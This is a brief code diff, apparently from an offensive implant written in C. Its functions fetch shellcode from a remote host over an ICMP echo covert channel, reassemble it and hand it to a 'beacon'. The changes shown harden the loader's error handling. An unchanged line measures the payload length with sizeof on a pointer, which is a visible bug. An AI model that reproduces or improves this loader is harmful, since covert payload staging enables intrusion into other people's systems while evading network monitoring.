@@ -377,7 +377,7 @@ char* get_payload(SOCKET s) {
     if (send_icmp(s, &dest, size_buf, size_payload_len, 0) != 0) {
         printf("[-] Failed to send seq=0 packet\n");
         closesocket(s);
-        return 1;
+        return NULL;
     }
 
     //// 2) Wait for and reassemble all fragments (Echo Replies)
@@ -385,7 +385,7 @@ char* get_payload(SOCKET s) {
     if (!shellcode) {
         printf("[-] Failed to receive full payload\n");
         closesocket(s);
-        return 1;
+        return NULL;
     }
 
     
@@ -419,6 +419,10 @@ int bridge_to_beacon() {
 
     //Grab payload over ICMP Bridge
     char * shellcode = get_payload(s);
+    if (!shellcode) {
+        fprintf(stderr, "[-] get_payload failed, exiting.\n");
+        exit(EXIT_FAILURE);
+    }
     unsigned int shellcode_len = (unsigned int)sizeof(shellcode);
 
     ///////////////////////////////////////////////////////////////////////
